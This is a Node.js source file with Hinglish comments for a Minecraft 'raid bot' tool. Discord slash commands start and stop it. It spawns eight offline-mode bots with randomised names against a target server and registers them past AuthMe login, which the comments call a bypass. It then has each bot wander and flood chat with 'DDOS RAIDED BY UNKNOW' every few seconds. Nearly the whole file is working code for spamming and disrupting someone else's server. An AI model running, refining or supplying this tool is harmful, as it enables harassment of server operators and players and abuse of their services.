const express = require('express');
const mineflayer = require('mineflayer');
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');

// Render ke liye web server taaki service active rahe
const app = express();
const PORT = process.env.PORT || 8080;

app.get('/', (req, res) => {
    res.send('Minecraft Raid Bot is running online!');
});

app.listen(PORT, () => {
    console.log(`Web server listening on port ${PORT}`);
});

// ---------------- CONFIGURATION ----------------
const SERVER_IP = process.env.SERVER_IP || 'YOUR_SERVER_IP_HERE';
const SERVER_PORT = parseInt(process.env.SERVER_PORT || '25565');
const PASSWORD = process.env.BOT_PASSWORD || 'RaidPass123';
const BASE_BOT_NAME = process.env.BOT_NAME || 'RaidBot';
const DISCORD_TOKEN = process.env.DISCORD_TOKEN || ''; // Discord Bot Token yahan environment se aayega
const TOTAL_BOTS = 8;
const MESSAGE_LIMIT = 50;
const MESSAGE_INTERVAL = 3000;
const COOLDOWN_TIME = 5 * 60 * 1000;

let activeBots = [];
let isRunning = false;

function startRaidBots() {
    if (isRunning) return;
    isRunning = true;
    activeBots = [];

    console.log(`[*] Total ${TOTAL_BOTS} bots spawn kiye ja rahe hain...`);

    for (let i = 0; i < TOTAL_BOTS; i++) {
        setTimeout(() => {
            if (!isRunning) return; // Agar beech mein stop ho gaya toh spawn rok dein

            const username = `${BASE_BOT_NAME}_${Math.floor(Math.random() * 9000 + 1000)}`;
            const bot = mineflayer.createBot({
                host: SERVER_IP,
                port: SERVER_PORT,
                username: username,
                auth: 'offline',
                brand: 'vanilla'
            });

            activeBots.push(bot);

            bot.on('spawn', () => {
                console.log(`[+] Bot ${username} successfully join ho gaya hai!`);

                // AuthMe / Login plugin bypass
                setTimeout(() => {
                    if (!isRunning) return;
                    bot.chat(`/register ${PASSWORD} ${PASSWORD}`);
                    setTimeout(() => {
                        if (!isRunning) return;
                        bot.chat(`/login ${PASSWORD}`);
                    }, 2000);
                }, 3000);

                // Movement Pattern: 5s move, 3s stop
                function startMovement() {
                    if (!isRunning) return;
                    bot.setControlState('forward', true);
                    bot.setControlState('jump', Math.random() > 0.5);
                    const randomYaw = Math.random() * Math.PI * 2;
                    bot.look(randomYaw, 0, true);

                    setTimeout(() => {
                        if (!isRunning) return;
                        bot.setControlState('forward', false);
                        bot.setControlState('jump', false);

                        setTimeout(() => {
                            startMovement();
                        }, 3000);
                    }, 5000);
                }

                setTimeout(startMovement, 4000);

                // Spam Chat Logic
                let messageCount = 0;
                const spamInterval = setInterval(() => {
                    if (!isRunning) {
                        clearInterval(spamInterval);
                        return;
                    }

                    if (messageCount >= MESSAGE_LIMIT) {
                        console.log(`[*] ${username} ne 50 messages bhej diye. 5 minutes ka cooldown shuru...`);
                        clearInterval(spamInterval);
                        
                        setTimeout(() => {
                            if (isRunning) {
                                messageCount = 0;
                            }
                        }, COOLDOWN_TIME);
                        return;
                    }

                    bot.chat('DDOS RAIDED BY UNKNOW');
                    messageCount++;
                }, MESSAGE_INTERVAL);

                bot.on('end', () => {
                    clearInterval(spamInterval);
                });
            });

            bot.on('error', (err) => {
                // Ignore errors on disconnect
            });
        }, i * 2000);
    }
}

function stopRaidBots() {
    if (!isRunning) return;
    isRunning = false;

    console.log(`[-] Sabhi bots ko disconnect kiya ja raha hai...`);
    activeBots.forEach(bot => {
        try {
            bot.quit();
        } catch (e) {}
    });
    activeBots = [];
}

// ---------------- DISCORD BOT SETUP ----------------
if (DISCORD_TOKEN) {
    const client = new Client({ intents: [GatewayIntentBits.Guilds] });

    client.once('ready', async () => {
        console.log(`[+] Discord Bot logged in as ${client.user.tag}`);

        // Register Slash Commands (/start and /stop)
        const commands = [
            new SlashCommandBuilder().setName('start').setDescription('Start the Minecraft raid bots'),
            new SlashCommandBuilder().setName('stop').setDescription('Stop and disconnect all raid bots')
        ].map(command => command.toJSON());

        const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
        try {
            await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
            console.log('[+] Discord Slash Commands (/start, /stop) registered successfully!');
        } catch (error) {
            console.error(error);
        }
    });

    client.on('interactionCreate', async interaction => {
        if (!interaction.isChatInputCommand()) return;

        if (interaction.commandName === 'start') {
            if (isRunning) {
                return interaction.reply({ content: '⚠️ Bots already running hain!', ephemeral: true });
            }
            startRaidBots();
            await interaction.reply({ content: '🚀 Raid bots start kar diye gaye hain! In-game join ho rahe hain...', ephemeral: true });
        } 
        else if (interaction.commandName === 'stop') {
            if (!isRunning) {
                return interaction.reply({ content: '⚠️ Koi bhi bot currently active nahi hai!', ephemeral: true });
            }
            stopRaidBots();
            await interaction.reply({ content: '🛑 Sabhi raid bots ko stop aur disconnect kar diya gaya hai!', ephemeral: true });
        }
    });

    client.login(DISCORD_TOKEN);
} else {
    console.log('[-] DISCORD_TOKEN missing! Discord integration disabled.');
}
